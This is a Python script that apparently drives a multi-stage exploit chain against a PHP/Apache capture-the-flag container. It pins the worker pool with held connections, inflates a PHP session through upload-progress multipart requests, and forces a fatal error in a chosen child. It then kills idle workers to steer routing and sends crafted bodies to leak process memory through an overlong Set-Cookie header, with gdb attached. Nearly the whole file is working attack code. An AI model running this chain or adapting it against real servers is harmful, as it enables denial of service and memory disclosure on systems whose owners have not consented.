#!/usr/bin/env python3
"""Single-process full chain: pin -> rinse -> A1(season) -> B1(arm) -> leak.

One process, one print stream, exact timing control. Reuses full_chain's
body builders (their BOUND is exp_aa's sender boundary).
"""
from __future__ import annotations

import argparse
import re
import secrets
import socket
import subprocess as sp
import sys
import threading
import time

import full_chain as FC
import exp_aa as E


def pool_children():
    r = sp.run(["docker", "exec", "cfphpctf-web", "sh", "-c",
                "pgrep -f apache2 | wc -l"], capture_output=True, text=True)
    try:
        return int(r.stdout.strip())
    except ValueError:
        return 0


def start_cl(host, port, path, body: bytes, response, timeout,
             stall_bytes: int = 0, stall_seconds: float = 0.0):
    """CL-framed POST; optional mid-body stall (gdb attach window)."""
    sock = socket.create_connection((host, int(port)), timeout=timeout)
    sock.settimeout(timeout)
    sock.sendall(b"POST " + path.encode() + b" HTTP/1.1\r\nHost: x\r\n"
                 b"Content-Type: multipart/form-data; boundary="
                 + E.MULTIPART_BOUNDARY + b"\r\n"
                 b"Content-Length: " + str(len(body)).encode()
                 + b"\r\nConnection: close\r\n\r\n")
    sent = 0
    if stall_bytes and len(body) > stall_bytes:
        sock.sendall(body[:stall_bytes])
        sent = stall_bytes
        print(f"[stall] sent={sent} sleeping {stall_seconds}s (gdb window)",
              flush=True)
        time.sleep(stall_seconds)
        rest = body[stall_bytes:]
    else:
        rest = body
    t0 = time.time()

    def pump():
        nonlocal sent
        try:
            # dribble the rest so the origin streams the parse live
            for i in range(0, len(rest), 65536):
                sock.sendall(rest[i:i + 65536])
                sent += min(65536, len(rest) - i)
        except OSError:
            pass
    th = threading.Thread(target=pump, daemon=True)
    th.start()
    return sock, th, t0


def finish_cl(sock, th, t0, timeout):
    data = b""
    try:
        th.join(timeout=30)
        sock.settimeout(timeout)
        while True:
            try:
                chunk = sock.recv(65536)
            except (socket.timeout, OSError):
                break
            if not chunk:
                break
            data += chunk
    finally:
        try:
            sock.close()
        except OSError:
            pass
    print(f"[slot] elapsed={time.time() - t0:.2f}s resp={len(data)}B",
          flush=True)
    return data


def pin_pool(host, port, count, pace, holders, stop):
    for i in range(count):
        if stop.is_set():
            break
        try:
            holders.append(E.open_accepted_holder(host, port, 5.0))
        except Exception as exc:
            print(f"[pin] holder {i} refused: {exc!r}", flush=True)
        time.sleep(pace)
    print(f"[pin] pinned {len(holders)} holders", flush=True)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", default="8080")
    ap.add_argument("--path", default="php/index.php")
    ap.add_argument("--gen-val", type=int, default=2000000)
    ap.add_argument("--target", type=int, default=34000000)
    ap.add_argument("--pin-count", type=int, default=133)
    ap.add_argument("--pin-pace", type=float, default=0.4)
    args = ap.parse_args()
    path = "/" + args.path.lstrip("/")
    host, port = args.host, args.port

    sid = secrets.token_hex(16)
    print(f"[*] rinse sid={sid}", flush=True)
    open("rinse_sid.txt", "w").write(sid)

    ns = argparse.Namespace(r1_trees=900, r2_pl=4000, r2_trees=300,
                            fill=0x1FEF00, forge_len=0x4000)
    r1, r2, _r2b, b1 = FC.build_bodies(sid, ns)
    print(f"[*] bodies: r1={len(r1)}B r2={len(r2)}B leak={len(b1)}B",
          flush=True)

    # 1. pin the pool while it is empty (fast accepts), rinse concurrently
    holders: list = []
    stop = threading.Event()
    pt = threading.Thread(target=pin_pool,
                          args=(host, port, args.pin_count, args.pin_pace,
                                holders, stop), daemon=True)
    pt.start()

    # 2. seed + stallers (the sess asset)
    seed = FC.part(b"PHPSESSID", sid.encode())
    seed += FC.part(b"PHP_SESSION_UPLOAD_PROGRESS", b"s")
    seed += FC.FILEPART
    for i in range(1030):
        seed += FC.part(b"d%05d" % i, b"1")
    seed += b"--" + E.MULTIPART_BOUNDARY + b"--\r\n"
    FC.post_full(host, port, path, seed)
    if FC.sess_size(sid) < 0:
        print("[-] seed failed", flush=True)
        return 1
    print("[seed] sess_S created", flush=True)

    stallers: list = []
    # apache Timeout=60 aborts an idle connection, and the abort's rshutdown
    # flush fatals on the big session (the staller self-destruct). Feed each
    # staller a few bytes every 20s to reset the idle timer; the bytes extend
    # the pending part value harmlessly.
    # NOTE: no feeder on purpose — apache Timeout=60 aborts the stalled
    # requests, and the abort's rshutdown flush-encode of a big in-memory
    # session IS the season fatal (the arm mechanism).
    k = 0
    while FC.sess_size(sid) < args.target:
        before = max(FC.sess_size(sid), 0)
        s = FC.open_staller(host, port, path, sid, args.gen_val, k)
        stallers.append(s)
        grew = False
        t0 = time.time()
        while time.time() - t0 < 25:
            if FC.sess_size(sid) > before + args.gen_val // 2:
                print(f"[gen {k}] {before} -> {FC.sess_size(sid)}",
                      flush=True)
                grew = True
                break
            time.sleep(1.0)
        if not grew:
            print(f"[gen {k}] stuck at {FC.sess_size(sid)} (cap reached)",
                  flush=True)
            break
        k += 1
    size = FC.sess_size(sid)
    print(f"[+] rinse done: {size} bytes, {len(stallers)} stallers",
          flush=True)
    if size < 24000000:
        print("[-] rinse too small", flush=True)
        for s in stallers:
            s.close()
        return 1

    # 3. wait for the pin, warm the pool, then release one holder
    while threading.active_count() > 2 and len(holders) < args.pin_count:
        time.sleep(1.0)
    # the parent spawns children at its own rate; the slots must not fire
    # while holder connections still sit unserved in the backlog
    n = 0
    for _ in range(90):
        n = pool_children()
        if n >= 145:
            break
        time.sleep(2.0)
    print(f"[*] pool warmed to {n} children", flush=True)

    # ---- helpers -------------------------------------------------------
    def latest_fatal_pid(since=None):
        # no window: the container clock drifts 30+ min behind the host and
        # the error log rides on stderr, so any --since/--tail slice misses
        # fatals. The full log scan is ~2s; the LAST matching line wins.
        r = sp.run(["docker", "logs", "cfphpctf-web"],
                   capture_output=True, text=True)
        pid = None
        for line in (r.stdout + r.stderr).splitlines():
            # the apache line order: [php:error] [pid N:tid N] ... PHP Fatal error:
            if "PHP Fatal error" in line:
                m = re.search(r"\[pid (\d+):", line)
                if m:
                    pid = m.group(1)
        return pid

    def busy_pids():
        # ss is not installed in the container; /tmp/busy.sh joins
        # /proc/net/tcp established inodes against each child's fds
        r = sp.run(["docker", "exec", "cfphpctf-web", "/tmp/busy.sh"],
                   capture_output=True, text=True)
        return set(r.stdout.split())

    def all_pids():
        r = sp.run(["docker", "exec", "cfphpctf-web", "pgrep", "-f",
                    "apache2"], capture_output=True, text=True)
        return set(r.stdout.split())

    def kill_idles(keep=None, tag=""):
        """SIGKILL every idle child except `keep` (and the parent). The
        parent cannot see queued connections, so idles otherwise steal the
        routing race from the armed child."""
        busy = busy_pids()
        idles = all_pids() - busy - {"1"}
        if keep:
            idles.discard(keep)
        if idles:
            sp.run(["docker", "exec", "cfphpctf-web", "kill", "-9"]
                   + sorted(idles), capture_output=True)
        print(f"[*] kill_idles{tag}: killed {len(idles)} "
              f"(busy={len(busy)})", flush=True)
        return len(idles)

    def pool_state(tag):
        r = sp.run(["docker", "exec", "cfphpctf-web", "sh", "-c",
                    "echo children=$(pgrep -f apache2 | wc -l); "
                    "for p in $(pgrep -f apache2); do "
                    "r=$(awk '/VmRSS/{print $2}' /proc/$p/status "
                    "2>/dev/null); echo \"$r $p\"; done | sort -rn | head -2"],
                   capture_output=True, text=True)
        print(f"[pool @{tag}] " + " | ".join(r.stdout.split("\n")[:3]),
              flush=True)

    # ---- season-fatal poll -----------------------------------------------
    # The late stallers decoded a ~30MB session; when their 60s idle timeout
    # aborts them, the rshutdown flush re-encodes it and the encode crosses
    # the limit -> the season fatal. The fatal'd child (alive, accepting,
    # carryover-pinned) is the arm target. No r1/A1 needed: the stallers ARE
    # the season.
    deadline = time.time() + 720
    target = None
    while time.time() < deadline:
        target = latest_fatal_pid(since="15m")
        if target:
            break
        time.sleep(3.0)
    if not target:
        print("[-] no staller season fatal within 720s; aborting",
              flush=True)
        return 1
    print(f"[+] SEASON FATAL on pid {target} = the arm target", flush=True)
    pool_state("post-season")

    def force_target(keep, tag=""):
        """Close every holder socket (their children free up), then kill
        the idles in rounds. With MinSpare=0 nothing respawns, so the arm
        target is provably the only accepting child."""
        while holders:
            try:
                holders.pop().close()
            except OSError:
                pass
        for i in range(4):
            kill_idles(keep=keep, tag=f"{tag}-{i}")
            time.sleep(0.3)

    # 5. B1: the r2 arm. Hit = resp 0B (the arm fatal = EOF, no response).
    armed = False
    for attempt in range(1, 21):
        force_target(target, tag=f" pre-B1-{attempt}")
        time.sleep(0.2)
        print(f"[*] B1 attempt {attempt}: body={len(r2)}B", flush=True)
        s, th, t0 = start_cl(host, port, path, r2, None, 120.0)
        b1_resp = finish_cl(s, th, t0, 30.0)
        if b1_resp == b"":
            new_pid = latest_fatal_pid()
            if new_pid == target:
                print(f"[+] B1 attempt {attempt}: ARM FATAL on the SAME "
                      f"child pid={target} (carryover confirmed)", flush=True)
            else:
                print(f"[!] B1 attempt {attempt}: EOF but newest fatal "
                      f"pid={new_pid} (target={target})", flush=True)
            armed = True
            break
        sc = b"Set-Cookie" in b1_resp
        print(f"[-] B1 attempt {attempt}: routed elsewhere "
              f"(resp={len(b1_resp)}B cookie={sc})", flush=True)
        time.sleep(0.4)
    if not armed:
        print("[-] arm never landed; aborting the leak", flush=True)

    # 6. the leak: stalled at 400000B; gdb attaches automatically at the
    # first stall. Miss = a normal-length cookie (fresh child) -> retry.

    def target_pid():
        # the gdb probe goes to the arm target (the season-fatal child),
        # not to the fattest child: post-bailout its RSS drops to ~30MB
        return latest_fatal_pid()

    gdb_proc = None
    leaked = False
    for attempt in range(1, 21):
        force_target(target, tag=f" pre-leak-{attempt}")
        time.sleep(0.2)
        if attempt == 1:
            pid = target
            print(f"[*] gdb probe -> arm target pid={pid}", flush=True)
            if pid:
                gdb_proc = sp.Popen(
                    ["docker", "exec", "cfphpctf-web", "gdb", "-p", pid,
                     "-batch", "-x", "/tmp/g_leak.gdb"],
                    stdout=open("gdb_leak.txt", "w"),
                    stderr=sp.STDOUT)
        print(f"[*] LEAK attempt {attempt}: body={len(b1)}B "
              f"(stall 10s @400000B)", flush=True)
        s, th, t0 = start_cl(host, port, path, b1, None, 120.0,
                             stall_bytes=400000, stall_seconds=10.0)
        lk_resp = finish_cl(s, th, t0, 30.0)
        i = lk_resp.find(b"Set-Cookie")
        clen = 0
        if i >= 0:
            j = lk_resp.find(b"\r\n", i)
            clen = (j if j > 0 else len(lk_resp)) - i
        print(f"[*] LEAK attempt {attempt}: cookie_hdr_len={clen}",
              flush=True)
        if clen > 200:
            print(f"[+] LEAK attempt {attempt}: OVERLONG COOKIE",
                  flush=True)
            print(f"[*] {lk_resp[:600]!r}", flush=True)
            leaked = True
            break
        if lk_resp:
            print(f"[*] LEAK attempt {attempt}: {lk_resp[:300]!r}", flush=True)
        else:
            print(f"[*] LEAK attempt {attempt}: EOF (child died mid-parse)",
                  flush=True)
        time.sleep(0.5)
    if gdb_proc:
        time.sleep(12)
        gdb_proc.kill()

    # 7. hold the asset briefly, then release
    print(f"[*] holding {len(stallers)} stallers 45s", flush=True)
    time.sleep(45)
    for s2 in stallers:
        try:
            s2.close()
        except OSError:
            pass
    print("[*] stallers released", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
